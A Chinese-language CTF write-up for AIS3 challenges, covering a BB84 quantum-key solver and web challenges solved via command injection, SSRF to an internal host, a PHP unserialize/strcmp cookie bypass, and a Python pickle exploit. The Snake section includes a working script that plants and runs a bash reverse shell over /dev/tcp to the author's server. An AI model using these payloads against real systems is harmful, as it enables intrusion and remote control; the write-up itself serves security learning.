qubits = [1j, 1j, (1+0j), (1+0j), 1j, 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (1+0j), 1j, (0.707-0.707j), 1j, (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), 1j, (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), 1j, 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707-0.707j), (1+0j), (0.707+0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707-0.707j), (1+0j), 1j, (1+0j), 1j, (0.707+0.707j), (0.707+0.707j), (1+0j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (1+0j), (0.707-0.707j), (1+0j), (1+0j), (0.707+0.707j), (1+0j), 1j, (0.707+0.707j), (0.707+0.707j), (1+0j), 1j, 1j, (1+0j), (1+0j), (0.707+0.707j), 1j, (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), 1j, 1j, (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (0.707+0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), (1+0j), 1j, (1+0j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (1+0j), (1+0j), 1j, (1+0j), 1j, 1j, (1+0j), (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), 1j, (1+0j), (1+0j), 1j, (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), 1j, 1j, (1+0j), (1+0j), 1j, (0.707+0.707j), 1j, (1+0j), 1j, (0.707-0.707j), 1j, 1j, (0.707-0.707j), (0.707-0.707j), 1j, (1+0j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), 1j, (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), 1j, (0.707-0.707j), (0.707-0.707j), (1+0j), 1j, (0.707-0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (1+0j), 1j, 1j, (1+0j), (1+0j), (1+0j), (0.707+0.707j), (1+0j), 1j, (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), 1j, (0.707-0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707+0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), 1j, (0.707+0.707j), 1j, 1j, 1j, 1j, (0.707+0.707j), 1j, (1+0j), (0.707-0.707j), (1+0j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (1+0j), (1+0j), 1j, (0.707+0.707j), (0.707-0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), 1j, 1j, (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (1+0j), 1j, (0.707+0.707j), (1+0j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707-0.707j), 1j, 1j, (1+0j), (0.707+0.707j), 1j, (1+0j), (1+0j), (1+0j), (1+0j), 1j, (0.707-0.707j), 1j, (1+0j), (1+0j), (0.707+0.707j), 1j, 1j, (0.707-0.707j), 1j, (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), 1j, (1+0j), 1j, 1j, (0.707-0.707j), 1j, (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), 1j, 1j, (1+0j), (1+0j), (1+0j), 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), 1j, (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), 1j, (1+0j), 1j, 1j, (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), 1j, (0.707-0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707-0.707j), 1j, 1j, (0.707-0.707j), 1j, 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (1+0j), 1j, 1j, 1j, (0.707+0.707j), (1+0j), (1+0j), (1+0j), (0.707-0.707j), (1+0j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), 1j, (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), 1j, (0.707+0.707j), 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), 1j, 1j, (0.707-0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), 1j, (0.707+0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), (1+0j), (0.707+0.707j), 1j, 1j, 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (1+0j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), (1+0j), 1j, (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), (1+0j), 1j, (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), 1j, 1j, 1j, 1j, (1+0j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (1+0j), (0.707+0.707j), (1+0j), (0.707-0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (1+0j), (1+0j), (1+0j), 1j, (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), 1j, (1+0j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (1+0j), (1+0j), (0.707+0.707j), 1j, 1j, (0.707-0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), (1+0j), (1+0j), 1j, (1+0j), (1+0j), 1j, 1j, 1j, (0.707-0.707j), (0.707-0.707j), (1+0j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), 1j, (0.707-0.707j), 1j, (0.707-0.707j), 1j, (0.707+0.707j), (1+0j), 1j, (0.707-0.707j), (0.707-0.707j), (1+0j), 1j, (1+0j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (0.707-0.707j), (1+0j), (1+0j), (1+0j), 1j, (0.707-0.707j), 1j, (0.707+0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (0.707+0.707j), 1j, (0.707-0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), 1j, (0.707+0.707j), (0.707+0.707j), 1j, (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), 1j, 1j, (0.707-0.707j), (1+0j), 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), 1j, (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), 1j, (1+0j), 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), 1j, (0.707-0.707j), 1j, 1j, 1j, (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), 1j, 1j, (1+0j), (1+0j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (0.707+0.707j), (1+0j), 1j, 1j, 1j, (0.707-0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707+0.707j), 1j, (1+0j), (1+0j), (1+0j), (0.707-0.707j), (1+0j), 1j, (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (1+0j), (1+0j), (0.707+0.707j), (1+0j), (1+0j), (0.707+0.707j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), 1j, (1+0j), (1+0j), (1+0j), (0.707-0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), 1j, 1j, (1+0j), (0.707-0.707j), 1j, (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), 1j, 1j, (0.707+0.707j), 1j, 1j, 1j, (0.707-0.707j), 1j, (0.707-0.707j), 1j, (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), (1+0j), 1j, 1j, (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), 1j, (0.707+0.707j), 1j, (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), (0.707+0.707j), 1j, (1+0j), 1j, 1j, (0.707-0.707j), (0.707-0.707j), 1j, (1+0j), 1j, (0.707+0.707j), 1j, (0.707-0.707j), (0.707+0.707j), (0.707+0.707j), 1j, (0.707+0.707j), 1j, (1+0j), (0.707+0.707j), (0.707+0.707j), (1+0j), 1j, 1j, 1j, 1j, (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), (0.707+0.707j), (0.707-0.707j), (0.707+0.707j), 1j, 1j, (0.707-0.707j), (0.707+0.707j), 1j, (1+0j), 1j, (0.707-0.707j), (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (0.707+0.707j), (1+0j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), 1j, (1+0j), 1j, 1j, (0.707+0.707j), (1+0j), 1j, (0.707-0.707j), 1j, (0.707+0.707j), 1j, 1j, (1+0j), 1j, 1j, (1+0j), 1j, (0.707+0.707j), (1+0j), 1j, (1+0j), 1j, (0.707-0.707j), 1j, 1j, (0.707-0.707j), 1j, (0.707+0.707j), (1+0j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (0.707-0.707j), (1+0j), (1+0j), (1+0j), (0.707+0.707j), 1j, (0.707-0.707j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (1+0j), (0.707+0.707j), (1+0j), (0.707+0.707j), (0.707-0.707j), 1j, 1j, (1+0j), (0.707-0.707j), (1+0j), (0.707-0.707j), (0.707+0.707j), 1j, 1j, (0.707+0.707j), (0.707-0.707j), 1j, 1j, (0.707+0.707j), (1+0j), (1+0j), (1+0j), (1+0j), (1+0j), (0.707-0.707j), (0.707+0.707j), (1+0j), (1+0j), (0.707-0.707j), (0.707-0.707j), (1+0j), (0.707+0.707j), (0.707+0.707j), (0.707-0.707j), (0.707-0.707j), 1j, (0.707+0.707j), (1+0j), (1+0j), (1+0j), (0.707-0.707j)]

my_basis = ['+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', '+', 'x', '+', '+', 'x', 'x', '+', 'x', '+', '+', '+', '+', 'x', 'x', 'x', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', 'x', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', '+', '+', '+', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', '+', '+', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', '+', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', 'x', 'x', '+', '+', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', '+', 'x', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', 'x', 'x', '+', '+', '+', '+', 'x', '+', '+', '+', '+', '+', '+', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', 'x', '+', '+', '+', 'x', '+', '+', 'x', '+', '+', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', 'x', 'x', '+', 'x', '+', '+', '+', '+', '+', '+', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', 'x', '+', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', 'x', '+', 'x', '+', '+', '+', 'x', 'x', '+', '+', 'x', 'x', '+', '+', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', 'x', '+', '+', '+', '+', 'x', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', 'x', 'x', '+', '+', 'x', '+', '+', '+', 'x', '+', 'x', '+', '+', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', '+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', '+', '+', '+', 'x', 'x', '+', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', 'x', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', '+', '+', '+', '+', 'x', 'x', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', '+', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', '+', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', 'x', 'x', '+', '+', 'x', '+', '+', 'x', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', '+', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', '+', '+', '+', '+', 'x', 'x', 'x', '+', 'x', '+']

final = 2114605261815340712424659413225647507317872952942366497800823462312932228799031989657646284020761432666257418566252521668

def rotate(q):
    # For diagonal basis measure
    return q * complex(0.707, -0.707)

# recover initial bitstream
bitstream = ''
for i in range(LEN):
    # print(qubits[i] == '1j')
    if basis[i] == '+' and qubits[i] == 1j:
        bitstream += '0'
    elif basis[i] == '+' and qubits[i] == 1+0j:
        bitstream += '1'
    elif basis[i] == 'x' and qubits[i] == 0.707-0.707j:
        bitstream += '0'
    elif basis[i] == 'x' and qubits[i] == 0.707+0.707j:
        bitstream += '1'

print(bitstream)
# print(len(bitstream)) # len = 1024

measured_bits = ''
for q, b in zip(qubits, basis):
    if b == 'x':
        q = rotate(q)
    
    probability_zero = round(pow(q.real, 2), 1) # if not correct, swap the two
    probability_one = round(pow(q.imag, 2), 1)

    measured_bits += str(np.random.choice(np.arange(0, 2), p=[probability_zero, probability_one]))


print(measured_bits)
# print(len(measured_bits)) # len = 1024

shared_key = ''
for bit, tx_base, rx_base in zip(measured_bits, basis, my_basis):
    if tx_base == rx_base:
        shared_key += bit

print(shared_key)
print(len(shared_key))

flag = int(shared_key[:400],2) ^ int(final)
flag_bin = hex(flag)[2:]

for i in range(0,len(flag_bin),2):
    print(chr(int(flag_bin[i:i+2],16)),end='')

```

![](https://i.imgur.com/xPvvWwg.png)

FLAG:`AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}`

## 🌐Web
### 🐿️Squirrel
Hack those creepy rats.

https://squirrel.ais3.org/

![](https://i.imgur.com/iSrbJMn.jpg)

一點開就看到了一堆不知道在衝三小的松鼠...

檢視原始碼看到，重點是有一個api可以把/etc/passwd 給印出來
```javascript
const squirrelFile = '/etc/passwd';

    fetch('api.php?get=' + encodeURIComponent(squirrelFile))
      .then(res => res.json())
      .then(data => {
        if ('error' in data) {
          throw data.error;
        }
        data.output.split('\n')
          .map(line => line.split(':')[0].trim())
          .filter(name => name.length)
          .forEach(name => new Squirrel(name).update());
      })
      .catch(err => {
        console.log(err);
        alert('Something went wrong! Please report this to the author!');
      });

```

這樣代表可以LFI，但是對於通靈猜出flag還是有一定的難度。

想到說可以猜猜看這個api的程式碼長什麼樣子，可以透過什麼方法讀檔

所以直接訪問
`https://squirrel.ais3.org/api.php?get=/var/www/html/api.php`

回傳ㄌ這個
```json
{
    "output": "<?php\n\nheader('Content-Type: application/json');\n\nif ($file = @$_GET['get']) {\n    $output = shell_exec(\"cat '$file'\");\n    \n    if ($output !== null) {\n        echo json_encode([\n            'output' => $output\n        ]);\n    } else {\n        echo json_encode([\n            'error' => 'cannot get file'\n        ]);\n    }\n} else {\n    echo json_encode([\n        'error' => 'empty file path'\n    ]);\n}\n"
}
```

也就是說，直接透過shell_exec 搭配cat的方法，這樣的話，只要跳脫cat就能做command injection


![](https://i.imgur.com/8oeFABb.png)

![](https://i.imgur.com/kmry2VH.png)


### 🦈Shark
Let's dive deep again this year.

https://shark.ais3.org/


點進去後發現
https://shark.ais3.org/?path=hint.txt

很明顯感覺就是可以讀取任意檔案
而且他提示說
Please find the other server in the internal network! (flag is on that server)
GET http://some-internal-server/flag


直接對/etc/passwd 存取，發現其實是有限制的
![](https://i.imgur.com/iC0583R.png)

用file繞過
![](https://i.imgur.com/wtyIBzC.png)

接下來是要想辦法找到區網的相關資料

在/etc/hosts 看到這台電腦的ip是172.22.0.3
![](https://i.imgur.com/ybzR0w0.png)

通靈一下看看隔壁的.2
https://shark.ais3.org/?path=http://172.22.0.2/flag

![](https://i.imgur.com/DeMD24F.png)

PS，後來看官方解才知道
有 `/proc/net/fib_trie` 這種神奇的東西可以看

![](https://i.imgur.com/lOvmtpW.png)


### 🐘Elephant
Do elephants love cookies?

https://elephant.ais3.org/

![](https://i.imgur.com/VN5D6oV.png)

題目提示說要看Cookie
![](https://i.imgur.com/rTQSe4X.png)

看起來是base64
![](https://i.imgur.com/zsMXWwl.png)

解碼後，感覺是Serialize的PHP的東西

原本想法到這邊就斷了，突然想到可以用dirsearch掃看看有沒有其他資料

![](https://i.imgur.com/a2r81r8.png)

一掃就發現了裡面有.git
使用Githack把資料挖下來

![](https://i.imgur.com/avDk0mx.png)

```php
class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}


$user = NULL;

if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}

```

可以看到透過strcmp比較，所以套用strcmp放陣列會爆炸的漏洞

自己寫一個相同的格式，token改成陣列再serialize
```php
<?php

class User{
    public $name;
    public $token;
}
$test = new User();
$test->name = "123456";
$test->token = array("8","7","8","7");

echo serialize($test);
//O:4:"User":2:{s:4:"name";s:6:"123456";s:5:"token";a:4:{i:0;s:1:"8";i:1;s:1:"7";i:2;s:1:"8";i:3;s:1:"7";}}
```

把這一段給轉Base64
`Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjthOjQ6e2k6MDtzOjE6IjgiO2k6MTtzOjE6IjciO2k6MjtzOjE6IjgiO2k6MztzOjE6IjciO319`

放入餅乾
![](https://i.imgur.com/aw3971Y.png)


### 🐍Snake
How to read that flag?

https://snake.ais3.org/

點開不囉唆，直接是程式碼
```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

看起來是用get收base64後的parameter，然後很明顯有標準的pickle漏洞

我把程式碼分了兩段執行

先插一個reverse shell，再去執行它
```python
import base64
import requests
import pickle

import os

url = "https://snake.ais3.org/?data="

class Test(object):
    def __reduce__(self):
        return (os.system,('''echo "bash -c 'bash -i >& /dev/tcp/我的伺服器ip/7877 0>&1'" > /tmp/878''',))


r = pickle.dumps(Test(), protocol=0)
c = base64.b64encode(r)
payload = str(c)[2:-1]

url1 = url + payload

res = requests.get(url1)


class Test(object):
    def __reduce__(self):
        return (os.system,('''bash /tmp/878''',))

r = pickle.dumps(Test(), protocol=0)
c = base64.b64encode(r)
payload = str(c)[2:-1]

url1 = url + payload

res = requests.get(url1)

```

主機開 `nc -vlk 7877` 來收
![](https://i.imgur.com/nvs0ydR.png)

get shell

### 🦏Rhino
Do you know why is this challenge called Rhino?

https://rhino.ais3.org/

這題滿好玩的，不過當時我沒有解出來QQ

卡在最後一步


首先先用dirsearch可以看到有`/package.json`

![](https://i.imgur.com/ShbILv2.png)

接下來就看出，他有一個chill.js

```javascript
const express = require('express');
const session = require('cookie-session');

let app = express();

app.use(session({
  secret: "I'm watching you."
}));

app.use('/', express.static('./'));

app.get('/flag.txt', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');

  let n = req.session.magic;

  if (n && (n + 420) === 420)
    res.sendFile('/flag');
  else
    res.send('you are a sad person too');
});

app.get('*', function(req, res){
  res.status(404).sendFile('404.html', { root: __dirname });
});

app.listen(process.env.PORT, '0.0.0.0');

```

